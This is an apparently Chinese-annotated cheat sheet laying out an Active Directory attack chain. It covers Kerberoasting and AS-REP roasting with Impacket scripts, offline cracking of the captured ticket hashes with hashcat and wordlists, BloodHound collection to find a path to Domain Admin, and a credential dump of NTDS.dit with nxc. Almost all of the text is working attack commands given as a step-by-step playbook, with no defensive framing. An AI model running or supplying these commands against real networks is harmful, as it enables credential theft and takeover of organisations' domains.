

   ```bash
   GetUserSPNs.py domain.local/user:Pass123 -dc-ip 10.0.0.1 -request -outputfile tgs.hash
   ```
   ```bash
   hashcat -m 13100 tgs.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
   ```


```bash
# 1. 验证凭据
nxc smb 10.0.0.1 -u user -p 'Pass123' -d domain.local

# 2. 提取 TGS
GetUserSPNs.py domain.local/user:Pass123 -dc-ip 10.0.0.1 \
  -request -outputfile tgs.hash

# 3. AS-REP 顺手一打
GetNPUsers.py domain.local/ -dc-ip 10.0.0.1 \
  -usersfile users.txt -no-pass -format hashcat \
  -outputfile asrep.hash

# 4. 离线爆破
hashcat -m 13100 tgs.hash rockyou.txt -r OneRuleToRuleThemAll.rule  # TGS-Rep
hashcat -m 18200 asrep.hash rockyou.txt                              # AS-Rep

# 5. 拿密码后采 BloodHound
bloodhound-python -u user -p 'Pass123' -d domain.local -ns 10.0.0.1 -c All --zip

# 6. 找路径：把 svc 账户标记为 Owned，看 Shortest Path to DA
```


```bash
nxc smb dc.domain.local -u svc -p 'CrackedPass' --ntds
# 直接 dump NTDS.dit
```


```text
1. nxc smb 验凭据 + 自动 spider 共享
2. GetUserSPNs + GetNPUsers 一气
3. bloodhound-python -c All 采集
4. 同时离线爆破（GPU 跑着）
5. 边等边过 BloodHound 查 Tier 0 / Pre-built attack paths
6. 破出密码 → 标记 Owned → 重新查路径
```
